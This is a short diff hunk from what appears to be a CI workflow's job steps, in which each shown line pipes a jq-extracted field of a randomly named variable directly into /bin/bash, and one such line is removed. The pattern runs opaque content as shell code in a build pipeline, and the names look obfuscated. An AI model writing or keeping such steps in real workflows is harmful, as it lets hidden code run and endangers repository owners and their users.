@@ -25,7 +25,6 @@ jobs:
           echo $f290 | jq -r .d98 | /bin/bash
           printf '%s' "$v1410" | jq -r .gdlou540 | /bin/bash
           echo $fdfpk5 | jq -r .cz2448 | /bin/bash
-          echo $x0 | jq -r .nhstx81 | /bin/bash
           echo $ip2 | jq -r .eh8646 | /bin/bash
           printf '%s' "$gh5" | jq -r .iwk75 | /bin/bash
           echo $qutkb168 | jq -r .sg71471 | /bin/bash
